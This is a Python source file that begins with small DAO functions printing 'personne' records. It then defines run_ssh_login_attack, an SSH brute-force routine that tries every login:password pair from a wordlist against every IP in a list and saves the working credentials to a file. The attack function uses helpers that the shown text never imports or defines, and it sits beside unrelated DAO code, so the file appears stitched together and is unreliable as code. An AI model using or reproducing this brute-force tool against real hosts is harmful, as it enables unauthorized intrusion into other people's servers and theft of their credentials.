
from src.dao.personne_dao import PersonneDao

dao = PersonneDao()


def get_all():
    personnes = dao.find_all()
    print("get_all :")
    for personne in personnes:
        print(personne)


def get_one():
    personne = dao.find_by_id(1)
    print("get_one :",personne)

#get_all()
#get_one()
def run_ssh_login_attack(ip_file_name,login_pswd_file_name,file_name_ssh_cxn_found):
    file_ip = file_service.get_file(ip_file_name, 'r')
    addresses = file_ip.readlines()

    file_login_pswd = open(login_pswd_file_name, 'r')
    logins_pswds = file_login_pswd.readlines()
    
    file_ip.close()
    file_login_pswd.close()
    ssh_cxn_found = 0
    
    for address in addresses:
        for line in logins_pswds:
            splited= line.split(":")
            check_ssh_connexion = connection_ssh(address,splited[0],splited[1])
            print("check ssh connexion ip:",address.replace('\n',"")," login:", splited[0]," password:",splited[1].replace('\n',"")," success:",check_ssh_connexion)
            if check_ssh_connexion:
                file_service.generated_file(file_name_ssh_cxn_found,[address+":"+splited[0]+":"+splited[1]])
                ssh_cxn_found= ssh_cxn_found+1
    return ssh_cxn_found
